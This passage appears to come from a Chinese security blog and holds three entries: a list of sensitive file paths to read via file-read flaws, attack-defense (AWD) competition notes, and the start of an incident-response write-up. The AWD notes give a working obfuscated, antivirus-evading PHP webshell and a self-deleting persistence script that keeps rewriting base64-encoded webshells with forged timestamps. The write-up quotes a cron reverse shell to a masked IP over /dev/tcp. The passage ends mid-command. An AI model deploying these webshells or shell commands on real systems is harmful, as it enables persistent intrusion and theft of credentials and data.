class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cmd">## windows<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">boot.ini</span> //查看系统版本</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">inetsrv</span>\<span class="hljs-title">MetaBase.xml</span> //<span class="hljs-title">IIS</span>配置文件</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">repair</span>\<span class="hljs-title">sam</span> //存储系统初次安装的密码</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">my.ini</span> //<span class="hljs-title">Mysql</span>配置</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> //<span class="hljs-title">Mysql</span> <span class="hljs-title">root</span></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">php.ini</span> //<span class="hljs-title">php</span>配置信息</span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">my.ini</span> //<span class="hljs-title">Mysql</span>配置信息</span><br><span class="hljs-function"></span><br><span class="hljs-function">## <span class="hljs-title">linux</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">authorized_keys</span> //如需登录到远程主机，需要到.<span class="hljs-title">ssh</span>目录下，新建<span class="hljs-title">authorized_keys</span>文件，并将<span class="hljs-title">id_rsa.pub</span>内容复制进去</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">id_rsa</span> //<span class="hljs-title">ssh</span>私钥,<span class="hljs-title">ssh</span>公钥是<span class="hljs-title">id_rsa.pub</span></span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">id_ras.keystore</span> //记录每个访问计算机用户的公钥</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">ssh</span>/<span class="hljs-title">known_hosts</span></span><br><span class="hljs-function">//<span class="hljs-title">ssh</span>会把每个访问过计算机的公钥(<span class="hljs-title">public</span> <span class="hljs-title">key</span>)都记录在~/.<span class="hljs-title">ssh</span>/<span class="hljs-title">known_hosts</span>。当下次访问相同计算机时，<span class="hljs-title">OpenSSH</span>会核对公钥。如果公钥不同，<span class="hljs-title">OpenSSH</span>会发出警告， 避免你受到<span class="hljs-title">DNS</span> <span class="hljs-title">Hijack</span>之类的攻击。</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span> // 账户信息</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">shadow</span> // 账户密码文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">my.cnf</span> //<span class="hljs-title">mysql</span> 配置文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">httpd</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">httpd.conf</span> // <span class="hljs-title">Apache</span>配置文件</span><br><span class="hljs-function">/<span class="hljs-title">etc</span>/<span class="hljs-title">redhat</span>-<span class="hljs-title">release</span> 系统版本 </span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">bash_history</span> //用户历史命令记录文件</span><br><span class="hljs-function">/<span class="hljs-title">root</span>/.<span class="hljs-title">mysql_history</span> //<span class="hljs-title">mysql</span>历史命令记录文件</span><br><span class="hljs-function">/<span class="hljs-title">var</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">mlocate</span>/<span class="hljs-title">mlocate.db</span> //全文件路径</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">fd</span>/<span class="hljs-title">fd</span>[0-9]*(文件标识符)</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">mounts</span> //记录系统挂载设备</span><br><span class="hljs-function">/<span class="hljs-title">porc</span>/<span class="hljs-title">config.gz</span> //内核配置文件</span><br><span class="hljs-function">/<span class="hljs-title">porc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">cmdline</span> //当前进程的<span class="hljs-title">cmdline</span>参数</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">sched_debug</span> 配置文件可以看到当前运行的进程并可以获得对应进程的<span class="hljs-title">pid</span></span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">pid</span>/<span class="hljs-title">cmdline</span>   则可以看到对应<span class="hljs-title">pid</span>进程的完整命令行。</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">net</span>/<span class="hljs-title">fib_trie</span>   内网<span class="hljs-title">IP</span></span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">environ</span>   环境变量</span><br><span class="hljs-function">/<span class="hljs-title">proc</span>/<span class="hljs-title">self</span>/<span class="hljs-title">loginuid</span>   当前用户</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>awd_note</title>
    <link href="/2023/11/13/awd-note/"/>
    <url>/2023/11/13/awd-note/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD笔记"><a href="#AWD笔记" class="headerlink" title="AWD笔记"></a>AWD笔记</h1><h2 id="一-Attack"><a href="#一-Attack" class="headerlink" title="一.Attack"></a>一.Attack</h2><blockquote><p>ssh上去快速打包web源码，本地webshell快速扫描分析，删除后门代码的同时，批量利用后门代码植入一遍内存马</p></blockquote><h3 id="1-php免杀马"><a href="#1-php免杀马" class="headerlink" title="1.php免杀马"></a>1.php免杀马</h3><blockquote><p><a href="http://xx/webshell.php?NGHy%5B%5D=2&amp;cskO%5B%5D=1">http://xx/webshell.php?NGHy[]=2&amp;cskO[]=1</a></p><p>Post:jMJFg[]&#x3D;2&amp;hwzcu[]&#x3D;1&amp;vr4E7SZ</p><p>Base64</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$tBzb</span>=<span class="hljs-string">&#x27;str_&#x27;</span>;<br>    <span class="hljs-variable">$rnZy</span>=<span class="hljs-variable">$tBzb</span>.<span class="hljs-string">&#x27;replace&#x27;</span>;<br>    <span class="hljs-variable">$FtPk</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rnZy</span>,<span class="hljs-number">6</span>);<br>    <span class="hljs-variable">$gEXT</span>=<span class="hljs-string">&#x27;zxcszxctzxcrzxc_zxcrzxcezxc&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NGHy&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cskO&#x27;</span>] &amp;&amp; @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NGHy&#x27;</span>]) === @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cskO&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$teVZ</span> = <span class="hljs-string">&#x27;str_re&#x27;</span>;<br>    <span class="hljs-variable">$gEXT</span>=<span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-string">&#x27;zxc&#x27;</span>,<span class="hljs-variable">$teVZ</span>,<span class="hljs-variable">$gEXT</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>();&#125;<br>    <span class="hljs-variable">$FtPk</span>=<span class="hljs-variable">$gEXT</span>.<span class="hljs-variable">$FtPk</span>;<br>    <span class="hljs-variable">$xkOz</span> = <span class="hljs-variable">$FtPk</span>(<span class="hljs-string">&quot;lxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOc&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;str_lxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcrlxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOceplalxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcclxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOcelxrTQGCUHEazhfsPpjqw4KnMoYWebZNIu5tkS92FXL6gdJvAOc&quot;</span>);<br>    <span class="hljs-variable">$ZWmQ</span> = <span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;GLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;baseGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf64_dGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCfecoGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCfdeGLrSY9Wgwyjti36pmV4RPIk0TsoJZ5AuM7xXcbqUeKv2QDFBCf&quot;</span>);<br>    <span class="hljs-variable">$oILO</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;Y3lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFJlYXlCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFRlX2lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFZ1lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFbmN0lCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFalCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGFWlCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF9ulCsoAhTEU6QPw7vjHcikg9uyY1M2zStW4Ne0fax8DILRKBOdGF&quot;</span>));<br>    <span class="hljs-variable">$QenO</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ZXsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJZhbCsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJgsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJkX1sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJBPsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJU1RbsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJJwsOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ==sOwBKWu5dP0zer7gc1DnvRXZxma6koqQlUA84VFyNTfSihjHpJ&quot;</span>));<br>    <span class="hljs-variable">$DAvG</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;MNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;dMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsnI0RMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsTdTMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsWMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIsgMNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs==MNHeTaw3SLQoBYRGJbAp7gqdm6hrzyO2W85l4PvjnFctCK9DIs&quot;</span>));<br>    <span class="hljs-variable">$KSCi</span> = <span class="hljs-variable">$ZWmQ</span>(<span class="hljs-variable">$xkOz</span>(<span class="hljs-string">&quot;2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;J12ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl02ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTlpOw=2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl=2ysd87jV5oaeI9xRQOLM3cUJXvh1pSZBPHkuFf4wiYmGDKbgTl&quot;</span>));<br>    @<span class="hljs-variable">$vNTbd</span> = <span class="hljs-variable">$QenO</span>;<br>    @<span class="hljs-variable">$$vNTbd</span> = <span class="hljs-variable">$DAvG</span>;<br>    @<span class="hljs-variable">$LDUmN</span>=<span class="hljs-variable">$vNTbd</span>.<span class="hljs-variable">$$vNTbd</span>;<br>    @<span class="hljs-variable">$BIiCw</span>=<span class="hljs-variable">$LDUmN</span>;<br>    @<span class="hljs-variable">$$BIiCw</span>=<span class="hljs-variable">$KSCi</span>;<br>    @<span class="hljs-variable">$TsxFw</span>=<span class="hljs-variable">$BIiCw</span>;<br>    @<span class="hljs-variable">$YnGke</span>=<span class="hljs-variable">$$BIiCw</span>;<br>    @<span class="hljs-variable">$udasE</span> = <span class="hljs-variable">$oILO</span>(<span class="hljs-string">&#x27;$gUVnv,$MLShB&#x27;</span>,<span class="hljs-string">&#x27;return &quot;$gUVnv&quot;.&quot;$MLShB&quot;;&#x27;</span>);<br>    @<span class="hljs-variable">$gSBdP</span>=<span class="hljs-variable">$udasE</span>(<span class="hljs-variable">$TsxFw</span>,<span class="hljs-variable">$YnGke</span>);<br>    @<span class="hljs-variable">$BvHh</span> = <span class="hljs-variable">$oILO</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$gSBdP</span>);<br>    @<span class="hljs-variable">$BvHh</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-php不死马，上传后访问php文件"><a href="#2-php不死马，上传后访问php文件" class="headerlink" title="2.php不死马，上传后访问php文件"></a>2.php不死马，上传后访问php文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (True) &#123;<br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>();<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-string">&#x27;./loginx.php&#x27;</span>;<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-string">&#x27;./admin/register.php&#x27;</span>; <br>    <span class="hljs-variable">$shelltime</span> = <span class="hljs-string">&quot;\&quot;2020-01-05 02:17:14\&quot;&quot;</span>;<br><span class="hljs-variable">$shell</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;PD9waHAKICAgICR0QnpiPSdzdHJfJzsKICAgICRyblp5PSR0QnpiLidyZXBsYWNlJzsKICAgICRGdFBrPXN1YnN0cigkcm5aeSw2KTsKICAgICRnRVhUPSd6eGNzenhjdHp4Y3J6eGNfenhjcnp4Y2V6eGMnOwogICAgaWYgKCRfR0VUWydOR0h5J10gIT09ICRfR0VUWydjc2tPJ10gJiYgQG1kNSgkX0dFVFsnTkdIeSddKSA9PT0gQG1kNSgkX0dFVFsnY3NrTyddKSl7CiAgICAkdGVWWiA9ICdzdHJfcmUnOwogICAgJGdFWFQ9c3Vic3RyX3JlcGxhY2UoJ3p4YycsJHRlVlosJGdFWFQpOwogICAgfWVsc2V7ZGllKCk7fQogICAgJEZ0UGs9JGdFWFQuJEZ0UGs7CiAgICAkeGtPeiA9ICRGdFBrKCJseHJUUUdDVUhFYXpoZnNQcGpxdzRLbk1vWVdlYlpOSXU1dGtTOTJGWEw2Z2RKdkFPYyIsICIiLCAic3RyX2x4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jcmx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jZXBsYWx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jY2x4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jZWx4clRRR0NVSEVhemhmc1BwanF3NEtuTW9ZV2ViWk5JdTV0a1M5MkZYTDZnZEp2QU9jIik7CiAgICAkWldtUSA9ICR4a096KCJHTHJTWTlXZ3d5anRpMzZwbVY0UlBJazBUc29KWjVBdU03eFhjYnFVZUt2MlFERkJDZiIsICIiLCAiYmFzZUdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmNjRfZEdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmZWNvR0xyU1k5V2d3eWp0aTM2cG1WNFJQSWswVHNvSlo1QXVNN3hYY2JxVWVLdjJRREZCQ2ZkZUdMclNZOVdnd3lqdGkzNnBtVjRSUElrMFRzb0paNUF1TTd4WGNicVVlS3YyUURGQkNmIik7CiAgICAkb0lMTyA9ICRaV21RKCR4a096KCJsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRiIsICIiLCAiWTNsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRkpsWVhsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRlJsWDJsQ3NvQWhURVU2UVB3N3ZqSGNpa2c5dXlZMU0yelN0VzROZTBmYXg4RElMUktCT2RHRloxbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZibU4wbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZhbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0ZXbENzb0FoVEVVNlFQdzd2akhjaWtnOXV5WTFNMnpTdFc0TmUwZmF4OERJTFJLQk9kR0Y5dWxDc29BaFRFVTZRUHc3dmpIY2lrZzl1eVkxTTJ6U3RXNE5lMGZheDhESUxSS0JPZEdGIikpOwogICAgJFFlbk8gPSAkWldtUSgkeGtPeigic093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEoiLCAiIiwgIlpYc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpaaGJDc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpnc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEprWDFzT3dCS1d1NWRQMHplcjdnYzFEbnZSWFp4bWE2a29xUWxVQTg0VkZ5TlRmU2loakhwSkJQc093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpVMVJic093QktXdTVkUDB6ZXI3Z2MxRG52UlhaeG1hNmtvcVFsVUE4NFZGeU5UZlNpaGpIcEpKd3NPd0JLV3U1ZFAwemVyN2djMURudlJYWnhtYTZrb3FRbFVBODRWRnlOVGZTaWhqSHBKPT1zT3dCS1d1NWRQMHplcjdnYzFEbnZSWFp4bWE2a29xUWxVQTg0VkZ5TlRmU2loakhwSiIpKTsKICAgICREQXZHID0gJFpXbVEoJHhrT3ooIk1OSGVUYXczU0xRb0JZUkdKYkFwN2dxZG02aHJ6eU8yVzg1bDRQdmpuRmN0Q0s5RElzIiwgIiIsICJkTU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXNuSTBSTU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXNUZFRNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJc1dNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJc2dNTkhlVGF3M1NMUW9CWVJHSmJBcDdncWRtNmhyenlPMlc4NWw0UHZqbkZjdENLOURJcz09TU5IZVRhdzNTTFFvQllSR0piQXA3Z3FkbTZocnp5TzJXODVsNFB2am5GY3RDSzlESXMiKSk7CiAgICAkS1NDaSA9ICRaV21RKCR4a096KCIyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbCIsICIiLCAiSjEyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbDAyeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbHBPdz0yeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbD0yeXNkODdqVjVvYWVJOXhSUU9MTTNjVUpYdmgxcFNaQlBIa3VGZjR3aVltR0RLYmdUbCIpKTsKICAgIEAkdk5UYmQgPSAkUWVuTzsKICAgIEAkJHZOVGJkID0gJERBdkc7CiAgICBAJExEVW1OPSR2TlRiZC4kJHZOVGJkOwogICAgQCRCSWlDdz0kTERVbU47CiAgICBAJCRCSWlDdz0kS1NDaTsKICAgIEAkVHN4Rnc9JEJJaUN3OwogICAgQCRZbkdrZT0kJEJJaUN3OwogICAgQCR1ZGFzRSA9ICRvSUxPKCckZ1VWbnYsJE1MU2hCJywncmV0dXJuICIkZ1VWbnYiLiIkTUxTaEIiOycpOwogICAgQCRnU0JkUD0kdWRhc0UoJFRzeEZ3LCRZbkdrZSk7CiAgICBAJEJ2SGggPSAkb0lMTygiIiwgJGdTQmRQKTsKICAgIEAkQnZIaCgpOwo/Pg==&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file1</span>) || !(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>,<span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file1</span>))==<span class="hljs-variable">$shelltime</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf &quot;</span>.<span class="hljs-variable">$file1</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file1</span>, <span class="hljs-variable">$shell</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch -amd &quot;</span>.<span class="hljs-variable">$shelltime</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$file1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file2</span>) || !(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>,<span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file2</span>))==<span class="hljs-variable">$shelltime</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm -rf &quot;</span>.<span class="hljs-variable">$file2</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>, <span class="hljs-variable">$shell</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch -amd &quot;</span>.<span class="hljs-variable">$shelltime</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$file2</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二-Defense"><a href="#二-Defense" class="headerlink" title="二.Defense"></a>二.Defense</h2><h3 id="1-waf部署"><a href="#1-waf部署" class="headerlink" title="1.waf部署"></a>1.waf部署</h3><ul><li>上传<code>waf.so</code>和<code>watchbird.php</code>文件存放在<code>/var/www/html</code>或其他目录中</li><li>安装：低权限<code>www-data</code>即可执行<code>php watchbird.php --install /var/www/html</code></li><li>启用：访问任意启用了waf的文件, 参数<code>?watchbird=ui</code>打开watchbird控制台, 创建一个初始密码</li><li>卸载：低权限<code>www-data</code>即可执行<code>php watchbird.php --uninstall /var/www/html</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记一次成功的应急并溯源红队身份</title>
    <link href="/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/"/>
    <url>/2023/10/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%88%90%E5%8A%9F%E7%9A%84%E5%BA%94%E6%80%A5%E5%B9%B6%E6%BA%AF%E6%BA%90%E7%BA%A2%E9%98%9F%E8%BA%AB%E4%BB%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次成功的应急并溯源红队身份"><a href="#记一次成功的应急并溯源红队身份" class="headerlink" title="记一次成功的应急并溯源红队身份"></a>记一次成功的应急并溯源红队身份</h1><blockquote><p>背景：某省护网二线打点的时候，被客户协调去远程应急溯源，通过还原攻击链，结合攻击痕迹溯源到红队本人。</p></blockquote><h2 id="1-应急-攻击路径还原"><a href="#1-应急-攻击路径还原" class="headerlink" title="1.应急-攻击路径还原"></a>1.应急-攻击路径还原</h2><h3 id="1-1-收集攻击痕迹"><a href="#1-1-收集攻击痕迹" class="headerlink" title="1.1 收集攻击痕迹"></a>1.1 收集攻击痕迹</h3><ol><li><p>登录被攻破的服务器，查看linux主机定时任务，发现反弹shell命令,取证并清除</p><p><code>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xx.xx.xx/xx 0&gt;&amp;1</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553925.png" alt="image-20231026113321010"></p><p><strong>得到红队vps-1：47.xx.xx.xx</strong></p></li><li><p>查看history命令，获取攻击手法</p><p>使用fscan扫描大杀器进行内网扫描，下载命令暴露了文件服务器</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202310261553335.png" alt="image-20231026141614095"></p><p><code>curl -o fscan_plus 